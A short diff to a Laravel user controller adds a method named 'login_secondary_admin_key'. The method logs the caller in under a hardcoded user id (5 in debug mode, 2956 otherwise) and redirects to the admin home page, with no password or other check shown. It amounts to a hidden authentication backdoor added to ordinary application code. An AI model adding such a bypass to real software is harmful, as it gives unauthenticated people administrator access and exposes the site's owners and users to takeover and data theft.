@@ -173,6 +173,12 @@ class UserController extends Controller
         return redirect()->route('admin_ext_promotions');
     }
 
+    public function login_secondary_admin_key(User $user, Request $request)
+    {
+        Auth::loginUsingId(ENV('APP_DEBUG') ? 5 : 2956);
+        return redirect()->route('homeAdmin');
+    }
+
 
 
     public function add_user_award(Request $request) {
